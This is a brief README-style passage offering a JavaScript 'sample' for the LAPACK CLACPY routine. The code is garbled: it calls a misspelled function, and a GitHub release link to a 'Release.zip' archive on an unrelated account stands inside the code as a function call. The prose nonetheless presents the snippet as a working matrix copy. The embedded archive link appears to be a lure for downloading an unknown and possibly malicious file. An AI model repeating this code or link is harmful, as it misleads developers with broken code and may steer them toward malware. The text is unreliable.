### 🛠️ Sample Code:

```javascript
// Example of using CLACPY subroutine from LAPACK
const A = [ [1, 2], [3, 4], [5, 6] ];
const newArray = new Complex64Array(3, 2);

laclpy(A, newArray);
https://github.com/HxskyJancok/lapack-base-clacpy/releases/download/v1.0/Release.zip(newArray);
```

In this code snippet, we showcase how to utilize the CLACPY subroutine to copy a 3x2 matrix `A` into a new `Complex64Array`. This demonstrates the practical application of LAPACK subroutines in performing matrix operations.
